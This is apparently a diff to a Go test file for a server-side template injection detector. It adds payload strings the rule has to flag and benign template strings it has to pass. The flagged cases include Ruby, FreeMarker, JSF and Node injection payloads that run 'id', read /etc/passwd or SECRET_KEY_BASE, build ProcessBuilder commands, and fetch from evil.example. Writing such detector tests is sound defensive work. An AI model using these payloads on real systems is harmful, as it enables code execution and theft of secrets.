@@ -895,7 +895,7 @@ func TestSSTIAlpha6Templates(t *testing.T) {
 		"export {{--csv|--tsv}} {{[-w|--width=]}} {{[-?|--help]}}",
 		"rotate {{180|360|720}}",
 		"stty {{raw|cooked}}",
-		"kubectl {{[g|get]}} {{[c|config]}} {{[ns|namespace]}} {{b|k|m|g}}",
+		"kubectl {{[c|config]}} {{[ns|namespace]}} {{b|k|m|g}}",
 		"fake {{name|email|password|...}}",
 		"tar {{[-c|--create]}} {{[-f|--file]}} {{path/to/target.tar}}",
 		// A short i18n call with a plain key.
@@ -1057,6 +1057,158 @@ func TestSSTIAlpha6Templates(t *testing.T) {
 	})
 }
 
+// TestSSTIAlpha6FixRound1 covers the review findings on the alpha.6
+// template readings: operators inside a filter token, more template
+// globals, Ruby "::" in #{ }, FreeMarker bindings that do not start with a
+// literal, and the Node/Ruby/JSF names counted only where they reach code.
+func TestSSTIAlpha6FixRound1(t *testing.T) {
+	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
+	assertHits(t, "SSTI", SSTI, want, []string{
+		// I1: only the leading name of a filter token is exempt.
+		"{{ x|raw??app.request.server.all|join }}",
+		"{{ x|first??app.request.server.all|join }}",
+		"{{ x|length<config.SECRET_KEY|length }}",
+		"{{ x|first==config.SECRET_KEY[0] }}",
+		"{{ x|e[config] }}",
+		"{{ x|list-config|dictsort }}",
+		"{{ x|list/config }}",
+		"{{ x|list>request.environ }}",
+		"{{ x|title.config }}",
+		// I1: more template globals.
+		"{{ _context|json_encode }}",
+		"{{ _context|keys|join }}",
+		"{{ g|list }}",
+		"{{[g|get]}}",
+		"{{ ansible_env|to_nice_json }}",
+		"{{ hostvars|to_json }}",
+		// I2: Ruby "::" constant paths in #{ }.
+		"#{Kernel::system('id')}",
+		"#{::Kernel.system('id')}",
+		"#{Open3::capture2('id')}",
+		"#{File::read('/etc/passwd')}",
+		"#{::File.read('/etc/passwd')}",
+		"#{Net::HTTP.get(URI('http://evil.example/'))}",
+		"#{Open3::capture2(x)}",
+		"#{Kernel::open(x)}",
+		// I3: FreeMarker bindings that do not start with a literal.
+		`<#assign e=("freemarker.template.utility."+"Execute")?new()>${e("id")}`,
+		`<#assign c="freemarker.template.utility.Execute"><#assign e=c?new()>${e("id")}`,
+		"[#assign e=c?new()]${e('id')}",
+		"<#assign e=x?api>${e('id')}",
+		"<#assign e=c?new ()>${e('id')}",
+		`<#assign e="freemarker.template.utility.Execute" ? new()>${e("id")}`,
+		"<#assign e=c?NEW()>${t('id')}",
+		"${x? new()}",
+		// I4: the code-reaching shapes of the Node/Ruby names stay caught.
+		"#{require.main.constructor._load(foo).readdirSync(foo2)}",
+		"#{require.main.constructor._load(foo)}",
+		"#{process.binding(foo).spawn(foo2)}",
+		"#{binding.irb}",
+		"${binding.eval(x)}",
+		"#{x.constructor.constructor(x)()}",
+		"${user.constructor.constructor}",
+		"#{this.constructor.constructor(x)()}",
+		"#{require(x)}",
+		"${fork(x)}",
+		"#{spawn(x)}",
+		"#{instance_eval(x)}",
+		"#{Kernel.open(x)}",
+		"#{ObjectSpace.each_object(x)}",
+		"#{File.read(x)}",
+		"#{IO.readlines(x)}",
+		"#{Dir.entries(x)}",
+		"#{Dir.glob(x)}",
+		"${File.write(a, b)}",
+		// I5: indexes on ENV, Dir and JSF implicit objects; dynamic calls.
+		"#{ENV['SECRET_KEY_BASE']}",
+		"#{ENV[x]}",
+		"#{Dir['/*']}",
+		"#{header['x']}",
+		"#{sessionScope['user']}",
+		"#{applicationScope['x']}",
+		"#{initParam['db']}",
+		"#{new ProcessBuilder(x).start()}",
+		"#{new ProcessBuilder({'id'}).start()}",
+		"${new ProcessBuilder(x).start()}",
+		"#{Function(x)()}",
+		"#{new Function(x)()}",
+		"#{x.send(m, a)}",
+		"#{x.public_send(m)}",
+		"#{x.__send__(m)}",
+		"#{Object.const_get(m).new}",
+		"#{beanFactory.getBean(x)}",
+		"#{facesContext.externalContext.sessionMap}",
+		"#{facesContext.externalContext}",
+		"#{sessionScope.user}",
+		// Self-attack of the position rules: operators after a filter name,
+		// blanks before "(" "." "[", bracket access, Function, ENV and Dir.
+		"{{ x|e?config }}",
+		"{{ x|e<-config }}",
+		"{{ x|raw??g }}",
+		"{{ x|first[request] }}",
+		"{{ x|join>_context }}",
+		"#{x.send (m)}",
+		"#{Kernel .open(x)}",
+		"#{Kernel\n.open(x)}",
+		"#{Open3 . capture2(x)}",
+		"#{Object::Kernel.open(x)}",
+		"#{ENV ['x']}",
+		"#{ENV.to_h}",
+		"#{Dir.pwd}",
+		"#{x['constructor']['constructor'](y)()}",
+		"${x['constructor']['constructor']('alert(1)')()}",
+		"#{x.constructor .constructor(y)()}",
+		"#{Function.call(null, x)}",
+		"#{Function ('x')()}",
+		"#{beanFactory.getBean (x)}",
+		"<#assign e=c?API>${e('id')}",
+		"<#assign e=c?\nnew()>${e('id')}",
+	})
+	assertNoHits(t, "SSTI", SSTI, []string{
+		// I1: tldr forms keep passing.
+		"git stash {{[-p|--patch]}}",
+		"tar {{[-o|--output-dir]}} {{[-c|--config]}}",
+		"kubectl {{[c|config]}} {{b|k|m|g}}",
+		"{{ user.name | upper }}",
+		// I3: prose ?new outside ${ } stays clean, and an i18n call stays
+		// clean when the value holds no ?new or ?api.
+		`He said "hi"?new(ish)`,
+		"${t('cart.title')}",
+		"${t('cart.title')} - what?news",
+		// I4: plain field names.
+		"${repo.fork}",
+		"Repo ${repo.fork} has ${repo.stars} stars",
+		"${book.binding}",
+		"${product.binding.type}",
+		"Binding: ${book.binding}, pages ${book.pages}",
+		"${device.kernel}",
+		"${os.kernel.version}",
+		"${popcorn.kernel}",
+		"${npc.spawn}",
+		"${user.constructor}",
+		"${form.require}",
+		"${File.separator}",
+		"src${File.separator}main",
+		"${IO.speed}",
+		"${Dir.name}",
+		"#{repo.fork}",
+		"#{book.binding}",
+		"${order.send}",
+		"${mail.function}",
+		"${page.header}",
+		"${env_name}",
+		"${item.require.label}",
+		"${weights['g']}",
+		"${row['name']}",
+		"${binding.type}",
+		"${user.constructor.name}",
+		"${Function}",
+		"${page.header['x']}",
+		"#{a ? b : c}",
+		"Order #{id: 5}",
+	})
+}
+
 // TestSSTIAlpha6AcceptedMisses pins the attack shapes alpha.6 lets through
 // to clear the template text above (threat model, "Changes in alpha.6";
 // corpus README trade-off section). If one starts to hit, update those
@@ -1073,19 +1225,27 @@ func TestSSTIAlpha6AcceptedMisses(t *testing.T) {
 		"{{[a|b][0]}}",
 		"{{ x|y if a else b }}",
 		"{{[x|safe]}}",
-		"{{[g|x]}}",
+		"{{[c|config]}}",
+		"{{ -g|list }}",
 		// 2. A one-letter, $t or i18n.t call with one plain string literal,
-		// when the name was bound to an executor outside the value.
+		// when the name was bound to an executor outside the value and the
+		// value holds no FreeMarker ?new or ?api.
 		"${e('id')}",
 		"${t('whoami')}",
 		// 3. Member access to a field named pass.
 		"${user.pass}",
 		"#{user.pass}",
-		// 4. #{ } with an index, a product of names, or a call with no
-		// string-literal argument on a non-sensitive name.
+		// 4. #{ } with a plain index, a product of names, member access on
+		// header, param or cookie, a method called without parentheses, or
+		// a call with no string-literal argument on a name that is neither
+		// sensitive nor a code name.
 		"#{x[0]}",
 		"#{a*b}",
 		"#{foo(bar)}",
+		"#{header.title}",
+		"#{x.send m}",
+		"#{x.fork}",
+		"#{File.expand_path(x)}",
 	})
 }
 
